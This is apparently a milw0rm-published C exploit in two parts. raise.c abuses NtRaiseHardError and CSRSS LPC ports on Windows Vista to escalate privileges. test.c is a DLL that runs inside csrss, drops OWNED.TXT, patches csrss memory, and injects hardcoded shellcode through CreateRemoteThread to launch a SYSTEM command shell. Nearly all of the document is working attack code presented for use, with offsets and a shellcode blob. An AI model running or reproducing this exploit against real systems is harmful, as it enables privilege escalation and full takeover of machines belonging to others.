//raise.c
//26-12-2006 ]erasmus[/ORC
//exploit NtRaiseHardError privesc and load dll into csrss
//this version only is vista, other version can be worked
//with proper offsets, i will complete them soon
//imperfect but sometime work, ok for proto type;)
//dll limit to 8 chars but maybe can work around by
//\xxx\..\dll type trick and use LoadLibraryW, now is
//C:\TEST but another drive maybe work
#define offs1 0x30
#define offs2 0xBBD0
#include "windows.h"
#include "stdio.h"
DWORD(WINAPI*NtConnectPort)(PHANDLE,PWORD,
PSECURITY_QUALITY_OF_SERVICE,PDWORD,PDWORD,PDWORD,PVOID,
PDWORD);
DWORD(WINAPI*NtQueryInformationProcess)(HANDLE,DWORD,PVOID,
DWORD,PDWORD);
DWORD(WINAPI*NtRaiseHardError)(DWORD,DWORD,DWORD,PVOID*,
DWORD,PDWORD);
HANDLE hl;
HANDLE hs;
DWORD sb;
LPVOID lpc(LPCWSTR w){//cesar trick
	WORD n[4];
	SECURITY_QUALITY_OF_SERVICE q;
	LPVOID p;
	DWORD d;
	DWORD c[6],s[3];
	BYTE b[0x28];
	n[0]=n[1]=wcslen(w)*2;
	*(PDWORD)(n+2)=(DWORD)w;
	memset(&q,0,sizeof(q));
	q.Length=sizeof(q);
	p=NULL;
	d=0x1000;
	memset(&c,0,sizeof(c));
	c[0]=sizeof(c);
	memset(&s,0,sizeof(s));
	s[0]=sizeof(s);
	memset(&b,0,sizeof(b));
	b[1]=1;
	hs=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,
	PAGE_READWRITE,0,d,NULL);
	if(!hs)return NULL;
	p=MapViewOfFile(hs,FILE_MAP_ALL_ACCESS,0,0,0);
	if(!p)return NULL;
	c[1]=(DWORD)hs;
	c[3]=d;
	c[4]=(DWORD)p;
	d=sizeof(b);
	if(NtConnectPort(&hl,n,&q,c,s,NULL,&b,&d))
	return NULL;
	sb=c[5];
	return p;
}

HANDLE e1,e11;
DWORD WINAPI tp1(LPVOID a){
	LPVOID p[7];
	DWORD d;
	p[0]=p+3;
	p[1]=p+5;
	p[2]=0;
	p[3]=(LPVOID)0x1B001AE;
	p[4]=L"\\??\\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	p[5]=(LPVOID)0x100010;
	p[6]=L"erasmus1";
	while(1){
		WaitForSingleObject(e1,INFINITE);
		NtRaiseHardError(0x40000018,3,3,p,0,&d);
		SetEvent(e11);
	}
	return 0;
}

DWORD aaa,bbb;
HANDLE e2,e22;
DWORD WINAPI tp2(LPVOID a){
	BYTE b[0xD8];
	LPVOID p[7];
	DWORD d;
	memset(&b,0,sizeof(b));
	*(PDWORD)(b+0x3C)=2;
	*(PDWORD)(b+0x48)=1;
	*(PDWORD)(b+0x4C)=1;
	p[0]=p+3;
	p[1]=p+5;
	p[2]=0;
	p[3]=(LPVOID)0xD600D6;
	p[4]=&b;
	p[5]=(LPVOID)0x100010;
	p[6]=L"erasmus2";
	while(1){
		WaitForSingleObject(e2,INFINITE);
		memcpy(&b,"C:\\TEST",8);
		*(PDWORD)(b+0x08)=aaa;
		*(PDWORD)(b+0x0C)=bbb;
		*(PDWORD)(b+0x70)=aaa+0x100;
		*(PDWORD)(b+0x74)=aaa+0x100;
		NtRaiseHardError(0x40000018,3,3,p,0,&d);
		SetEvent(e22);
	}
	return 0;
}

STARTUPINFO cps;
PROCESS_INFORMATION cpi;
void w(DWORD a,DWORD d){
	HWND h;
	aaa=d;
	bbb=a;
	SetEvent(e1);
	do{h=FindWindow(NULL,"erasmus1");}while(!h);
	CreateProcess(NULL,"notepad",NULL,NULL,0,0,NULL,NULL,&cps,
	&cpi);
	Sleep(100);
	SendMessage(h,WM_CLOSE,0,0);
	Sleep(100);
	SetEvent(e2);
	do{h=FindWindow(NULL,"erasmus2");}while(!h);
	TerminateThread(cpi.hThread,0);
	Sleep(100);
	CreateProcess(NULL,"notepad",NULL,NULL,0,0,NULL,NULL,&cps,
	&cpi);
	Sleep(100);
	SendMessage(h,WM_CLOSE,0,0);
	Sleep(100);
}

int main(int c,char**v){
	char sd[MAX_PATH];
	char dp[MAX_PATH];
	WCHAR pp[MAX_PATH];
	WCHAR pn[MAX_PATH];
	HMODULE nt,kr,ad;
	DWORD se,cs,ws,u,d,h;
	HANDLE t;
	LPBYTE sc;
	GetSystemDirectory(sd,sizeof(sd));
	sprintf(dp,"%s\\csrsrv.dll",sd);
	cs=(DWORD)LoadLibrary(dp);
	sprintf(dp,"%s\\winsrv.dll",sd);
	ws=(DWORD)LoadLibrary(dp);
	sprintf(dp,"%s\\ntdll.dll",sd);
	nt=LoadLibrary(dp);
	sprintf(dp,"%s\\kernel32.dll",sd);
	kr=LoadLibrary(dp);
	sprintf(dp,"%s\\advapi32.dll",sd);
	ad=LoadLibrary(dp);
	*(LPVOID*)&NtConnectPort=GetProcAddress(nt,"NtConnectPort");
	*(LPVOID*)&NtQueryInformationProcess=GetProcAddress(nt,
	"NtQueryInformationProcess");
	*(LPVOID*)&NtRaiseHardError=GetProcAddress(nt,
	"NtRaiseHardError");
	if(2==c){
		d=atoi(v[1]);
		if(!d){
			printf("no args need\n");
			return -1;
		}
		t=OpenProcess(PROCESS_ALL_ACCESS,0,d);
		if(!t){
			printf("no args need\n");
			return -1;
		}
		__asm mov eax,fs:[0x18]
		__asm mov eax,[eax+0x30]
		__asm mov eax,[eax+0x1D4]
		__asm mov se,eax
		if(se)swprintf(pp,L"\\Sessions\\%d\\Windows",se);
		else swprintf(pp,L"\\Windows");
		swprintf(pn,L"%s\\ApiPort",pp);
		sc=(LPBYTE)lpc(pn);
		swprintf(pn,L"%s\\SbApiPort",pp);
		if(!sc)sc=(LPBYTE)lpc(pn);
		if(!sc)return -1;
		h=0;
		DuplicateHandle(GetCurrentProcess(),hs,t,(LPHANDLE)&h,0,0,2);
		WriteProcessMemory(t,&hs,&h,4,&d);
		WriteProcessMemory(t,&sb,&sb,4,&d);
		Sleep(INFINITE);
	}else{
		STARTUPINFO cps;
		PROCESS_INFORMATION cpi;
		hs=sc=NULL;
		sb=0;
		memset(&cps,0,sizeof(cps));
		cps.cb=sizeof(cps);
		cps.dwFlags=STARTF_USESHOWWINDOW;
		sprintf(sd,"\"%s\" %d",v[0],GetCurrentProcessId());
		if(!CreateProcess(NULL,sd,NULL,NULL,0,
					CREATE_NEW_PROCESS_GROUP|CREATE_NEW_CONSOLE,NULL,NULL,&cps,
					&cpi)){
			printf("spawn fail\n");
			return -1;
		}
		Sleep(3000);
		if(!hs){
			printf("lpc fail\n");
			return -1;
		}
		sc=(LPBYTE)MapViewOfFile(hs,FILE_MAP_ALL_ACCESS,0,0,0);
	}
	memset(&cps,0,sizeof(cps));
	cps.cb=sizeof(cps);
	cps.dwFlags=STARTF_USESHOWWINDOW;
	e1=CreateEvent(NULL,0,0,NULL);
	e11=CreateEvent(NULL,0,0,NULL);
	CreateThread(NULL,0,tp1,NULL,0,NULL);
	e2=CreateEvent(NULL,0,0,NULL);
	e22=CreateEvent(NULL,0,0,NULL);
	CreateThread(NULL,0,tp2,NULL,0,NULL);
	u=cs+offs2;
	*(PDWORD)(sc+offs1)=(DWORD)GetProcAddress(kr,"LoadLibraryA");
	w(u,sb);
	Sleep(INFINITE);
	return 0;
}



//test.c
//26-12-2006 ]erasmus[/ORC
//dll for load in csrss by raise.c
//repair csrss and create OWNED.TXT and try create system cmd
//i can exec shell code in lpc shared section but LoadLibrary
//is for work around of DEP on vista
//also imperfect but also is proto type!
//offsets is for vista
#define offs1 0x5F89
#define offs2 0xBBD0
#define offs3 0xBBFC
#define offs4 0x3F0CC
#include "windows.h"
LONG WINAPI uef(LPEXCEPTION_POINTERS a){
	Sleep(INFINITE);
	return 0;
}

DWORD WINAPI tp(LPVOID a){
	HMODULE kr,ws;
	BYTE b[0x100];
	DWORD c,d;
	HANDLE h,t;
	kr=GetModuleHandle("kernel32");
	ws=GetModuleHandle("winsrv");
	h=OpenProcess(PROCESS_ALL_ACCESS,0,*(LPDWORD)((DWORD)ws+offs4));
	c=(DWORD)VirtualAllocEx((HANDLE)h,NULL,sizeof(b),MEM_COMMIT,PAGE_EXE
	CUTE_READWRITE);
	d=(DWORD)GetProcAddress(kr,"CreateProcessA")-(c+69);
	memcpy(b,"\x33\xC0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x
50\x50\xE8\x10\x00\x00\x00\x57\x69\x6E\x53\x74\x61\x30\x5C\x44\x65\x
66\x61\x75\x6C\x74\x00\x50\x6A\x44\x8B\xCC\x68\x63\x6D\x64\x00\x50\x
50\x50\x50\x54\x51\x50\x50\x50\x50\x50\x50\x83\xC1\xFC\x51\x50\xE8\x
00\x00\x00\x00\x83\xC4\x58\xC3",73);
	*(LPDWORD)(b+65)=d;
	WriteProcessMemory((HANDLE)h,(LPVOID)c,b,sizeof(b),&d);
	t=CreateRemoteThread((HANDLE)h,NULL,0,(LPTHREAD_START_ROUTINE)c,NULL
	,0,NULL);
	WaitForSingleObject(t,INFINITE);
	return 0;
}

BOOL WINAPI DllMain(HANDLE a,DWORD dwReason,LPVOID c){
	DWORD cs,d;
	LPDWORD p,f,l;
	HANDLE h;
	if(DLL_PROCESS_ATTACH==dwReason){
		SetUnhandledExceptionFilter(uef);
		h=CreateFile("C:\\OWNED.TXT",GENERIC_WRITE,0,NULL,
		CREATE_ALWAYS,FILE_FLAG_WRITE_THROUGH,NULL);
		WriteFile(h,"greetz from csrss!\r\n",20,&d,NULL);
		CloseHandle(h);
		cs=(DWORD)GetModuleHandle("csrsrv");
		*(LPDWORD)(cs+offs2)=0;
		__asm mov eax,esp
		__asm mov p,eax
		while(1){
			if(cs+offs1==*p){
				*p=(DWORD)ExitThread;
				d=p[1]+8;
				break;
			}
			p=p+1;
		}
		p=*(LPDWORD*)(cs+offs3)+2;
		f=p;
		while(d!=f[0])f=*(LPDWORD*)f;
		l=p;
		while(d!=l[1])l=*(LPDWORD*)(l+1);
		*(LPDWORD*)f=l;
		*(LPDWORD*)(l+1)=f;
		for(d=0;d<100;d=d+1){
			p=(LPDWORD)HeapAlloc(GetProcessHeap(),0,0xD8);
			memset(p,0,0xD8);
			p[2]=(DWORD)p+0x08;
			p[3]=(DWORD)p+0x08;
			p[4]=(DWORD)p+0x10;
			p[5]=(DWORD)p+0x10;
			p[13]=0x240000;
			p[15]=1;
			p[16]=1;
			p[28]=(DWORD)p+0x78;
			p[29]=(DWORD)p+0x80;
		}
		p=(LPDWORD)GetProcessHeap();
		while(1){
			p=p+1;
			if(0x60005==*p&&p[1]>(DWORD)p&&p[1]<(DWORD)p+0x100&&
					!strcmp(*(LPSTR*)(p+1),"CSRSS")){
				d=p[1]+6;
				while(1){
					p=p-1;
					if(d-(DWORD)p==*p)break;
				}
				break;
			}
		}
		*(LPDWORD*)(cs+offs2)=p;
		Sleep(0);
		CreateThread(NULL,0,tp,NULL,0,NULL);
	}
	return TRUE;
}

// milw0rm.com [2007-01-03]
